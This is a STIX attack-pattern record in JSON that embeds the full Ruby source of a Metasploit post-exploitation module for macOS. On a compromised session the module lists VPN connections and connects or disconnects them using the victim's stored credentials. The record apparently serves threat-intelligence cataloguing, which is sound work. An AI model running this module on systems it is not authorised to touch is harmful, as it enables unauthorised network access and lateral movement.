{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b5212438-b999-4e28-bbbd-14614e4f6d8a",
    "created": "2024-08-14T16:33:00.692821Z",
    "modified": "2024-08-14T16:33:00.692825Z",
    "name": "OSX VPN Manager",
    "description": " This module lists VPN connections and tries to connect to them using stored credentials.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/osx/manage/vpn.rb",
            "external_id": "vpn.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n\n  STR_CONNECTED = '* (Connected)'\n  STR_DISCONNECTED = '* (Disconnected)'\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'OSX VPN Manager',\n        'Description' => %q{\n          This module lists VPN connections and tries to connect to them using stored credentials.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Peter Toth <globetother[at]gmail.com>'\n        ],\n        'Platform' => [ 'osx' ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ],\n        'Actions' => [\n          [ 'LIST', { 'Description' => 'Show a list of VPN connections' } ],\n          [ 'CONNECT', { 'Description' => 'Connect to a VPN using stored credentials' } ],\n          [ 'DISCONNECT', { 'Description' => 'Disconnect from a VPN' } ]\n        ],\n        'DefaultAction' => 'LIST'\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('VPN_CONNECTION', [true, 'Name of VPN connection. `set ACTION LIST` to get a list.', 'OSX_VPN']),\n        OptString.new('SCUTIL_PATH', [true, 'Path to the scutil executable.', '/usr/sbin/scutil']),\n        OptString.new('NETWORKSETUP_PATH', [true, 'Path to the networksetup executable.', '/usr/sbin/networksetup'])\n      ]\n    )\n  end\n\n  def run\n    fail_with(Failure::BadConfig, 'Invalid action') if action.nil?\n\n    scutil_path = datastore['SCUTIL_PATH'].shellescape\n    networksetup_path = datastore['NETWORKSETUP_PATH'].shellescape\n    vpn_name = datastore['VPN_CONNECTION']\n\n    if !file?(scutil_path)\n      print_error('Aborting, scutil binary not found.')\n      return\n    end\n\n    if !file?(networksetup_path)\n      print_error('Aborting, networksetup binary not found.')\n      return\n    end\n\n    # Fetch the list of configured VPN connections\n    cmd_list = \"#{scutil_path} --nc list\"\n    vprint_status(cmd_list)\n    vpn_data = cmd_exec(cmd_list)\n    connected_names = parse_vpn_connection_names(vpn_data, :connected)\n    disconnected_names = parse_vpn_connection_names(vpn_data, :disconnected)\n\n    if action.name == 'LIST'\n      if !connected_names.empty?\n        print_status('VPN Connections Status: UP')\n        connected_names.each do |vpn_name|\n          print_good('  ' + vpn_name)\n        end\n      end\n      if !disconnected_names.empty?\n        print_status('VPN Connections Status: DOWN')\n        disconnected_names.each do |vpn_name|\n          print_good('  ' + vpn_name)\n        end\n      end\n    elsif action.name == 'CONNECT'\n      if connected_names.include?(vpn_name)\n        print_status(\"#{vpn_name} already connected\")\n        return\n      end\n\n      unless disconnected_names.include?(vpn_name)\n        print_error(\"#{vpn_name} not found\")\n        return\n      end\n\n      cmd_up = \"#{networksetup_path} -connectpppoeservice '#{vpn_name}'\"\n      vprint_status(cmd_up)\n      cmd_exec(cmd_up)\n    elsif action.name == 'DISCONNECT'\n      if disconnected_names.include?(vpn_name)\n        print_status(\"#{vpn_name} already disconnected\")\n        return\n      end\n\n      unless connected_names.include?(vpn_name)\n        print_error(\"#{vpn_name} not found\")\n        return\n      end\n\n      identifier = parse_vpn_connection_identifier(vpn_data, vpn_name)\n      unless identifier\n        print_error(\"Could not parse #{vpn_name} identifier\")\n        return\n      end\n      cmd_down = \"#{scutil_path} --nc stop #{identifier}\"\n      vprint_status(cmd_down)\n      cmd_exec(cmd_down)\n    end\n  end\n\n  def parse_vpn_connection_names(data, type = :connected)\n    lines = data.lines\n    connection_names = []\n    comp_str = type == :connected ? STR_CONNECTED : STR_DISCONNECTED\n\n    lines.each do |line|\n      if line.start_with?(comp_str) && line =~ /\"(.*)\"/\n        connection_names << ::Regexp.last_match(1)\n      end\n    end\n    return connection_names\n  end\n\n  def parse_vpn_connection_identifier(data, vpn_name)\n    lines = data.lines\n    lines.each do |line|\n      line.strip!\n      next if line.empty?\n\n      if line.include?(vpn_name) && line =~ /([0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12})/\n        identifier = ::Regexp.last_match(1)\n        return identifier\n      end\n    end\n    return nil\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'osx' ]"
    ]
}